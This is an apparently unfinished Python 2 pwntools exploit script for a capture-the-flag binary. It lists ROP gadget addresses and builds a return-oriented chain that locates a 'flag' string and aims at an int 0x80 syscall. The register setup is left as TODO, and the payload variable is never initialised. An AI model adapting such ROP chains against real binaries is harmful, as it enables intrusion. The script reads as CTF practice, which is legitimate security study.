#python2

from pwn import *

context.binary = './static'

io = process('./static') #remote("plzpwn.me", 6003)

# 0x08049533 : int 0x80
pure_int80 = p32(0x08049533)

# !! No dec for ECX
#0x08062b83 : dec eax ; ret : dec eax ; ret
pure_dec_eax = p32(0x08062b83)
# 0x080c6b53 : dec ebp ; ret
pure_dec_ebp = p32(0x080c6b53)
# 0x080d0112 : dec ebx ; ret
pure_dec_ebx = p32(0x080d0112)
# 0x080c7b2c : dec edi ; ret
pure_dec_edi = p32(0x080c7b2c)
# 0x080cf900 : dec edx ; ret
pure_dec_edx = p32(0x080cf900)
# 0x08073b84 : dec esi ; ret
pure_dec_esi = p32(0x08073b84)
# 0x080a8c16 : dec esp ; ret
pure_dec_esp = p32(0x080a8c16)

# 0x0807c01a : inc eax ; ret
pure_inc_eax = p32(0x0807c01a)
# 0x08049d7c : inc ebp ; ret
pure_inc_ebp = p32(0x08049d7c)
# 0x0805e06b : inc ebx ; ret
pure_inc_ebx = p32(0x0805e06b)
# 0x080c49cf : inc ecx ; ret
# Warning: no dec
pure_inc_ecx = p32(0x080c49cf)
# 0x08049c64 : inc edi ; ret
pure_inc_edi = p32(0x08049c64)
#0x08052846 : inc esi ; ret
pure_inc_esi = p32(0x08052846)
#0x0809b831 : inc esp ; ret
pure_inc_esp = p32(0x0809b831)

# 0x080675e0 : add eax, ecx ; ret
# 0x08067e03 : add eax, edx ; ret
# 0x08090d40 : add ebx, ebp ; ret

pure_add_ecx_to_eax = p32(0x080675e0)
pure_add_edx_to_eax = p32(0x08067e03)
pure_add_ebp_to_ebx = p32(0x08090d40)


# 0x0807c97d : add al, 0xe9 ; ret
pure_add_x9_to_al = p32(0x0807c97d)


# 0x08064564 : mov eax, edx ; ret
# 0x0806b05f : mov esi, edx ; ret
# 0x080a8ee3 : mov esp, ecx ; ret
pure_mov_edx_to_eax = p32(0x08064564)
pure_mov_edx_to_esi = p32(0x0806b05f)
pure_add_ecx_to_esp = p32(0x080a8ee3)

# 0x08056200 : xor eax, eax ; ret
pure_xor_eax = p32(0x08056200)

# 0x0809bfc6 : jbe 0x809bfd1 ; xor edx, edx ; pop ebx ; mov eax, edx ; pop esi ; pop edi ; ret
dirty1 = p32(0x0809bfc6)

#0x080c0cc6 : mov edi, dword ptr [edx] ; ret
dirty2 = p32(0x080c0cc6)

#0x08052424 : sub eax, edi ; ret
pure_sub_edi_from_eax = p32(0x08052424)

#0x08056f10 : mov eax, dword ptr [eax] ; ret

pure_deref_eax_to_eax = p32(0x08056f10)


# 0x08052424 : sub eax, edi ; ret

# 0x080a8c55 : inc eax ; push eax ; ret
# 0x080a8c49 : push eax ; dec esp ; ret
# 0x080832bc : push eax ; ret
pure_push_eax = p32(0x080832bc)

#0x08048b12 : push edi ; ret
pure_push_edi = p32(0x08048b12)



'''
0x080af2ce : flag
0x080bc624 : flag
0x080bd804 : flag
0x080c3ece : flag
'''


# Ok steps are:
# /flag -> galf/
# 1 push "flag"
# 2 push "/" 
# 3 set registers for read to stdout
# 4 int 80

# push flag
pay += "A"*8 #padding
pay += pure_xor_eax #eax=0
pay += dirty2 # pracically: as [edx]==0, edi=0

pay += pure_add_ecx_to_eax # eax=ECX  0x80da340 (_IO_2_1_stdin_) ◂— 0xfbad2288


# 0x80da340-0x080c3ece = 91250
# 302^2 = 91204
pay += pure_inc_edi * 302 #edi=302
# eax -= 91250
pay += pure_sub_edi_from_eax * 302 #eax -= 91204

pay += dirty2 # pracically: as [edx]==0, edi=0
pay += pure_inc_edi * 46 #edi=46
pay += pure_sub_edi_from_eax # eax -= 46

# as a result, [eax]="flag"

# eax = "flag"
pay += pure_deref_eax_to_eax
pay += pure_push_eax

# part 1  done

# part 2 "push /"
pay += pure_inc_edi #edi = 47
pay += pure_push_edi

# part 3: set registers
## TODO

# part 4
pure_int80